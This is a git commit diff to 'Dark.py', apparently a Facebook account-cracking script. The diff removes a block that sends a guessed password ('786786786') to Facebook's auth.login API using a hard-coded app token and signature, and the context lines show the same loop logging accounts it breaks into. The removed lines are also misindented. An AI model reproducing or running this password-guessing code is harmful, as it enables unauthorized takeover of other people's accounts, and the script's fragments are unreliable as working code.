1b66c4219b1cd4f1e9e1449eab037f7f7e92583d
haxorawwnn <85847935+haxorawwnn@users.noreply.github.com>
2021-06-19 23:15:02 +0500

    Update Dark.py

--- Dark.py
+++ Dark.py
@@ -347,13 +347,6 @@ def pilih_super():
 									        if 'access_token' in q:
 										        print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass8
 										        oks.append(user+pass8)
-									    else:
-						                    pass9 = '786786786'
-						                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					                        q = json.load(data)
-					                         if 'access_token' in q:
-						                         print '\x1b[1;32m[\x1b[1;32mSuccessful\x1b[1;32m]\x1b[1;32m ' + user + ' \x1b[1;32m|\x1b[1;32m ' + pass9
-						                         oks.append(user+pass9)
 		except:
 			pass
 		
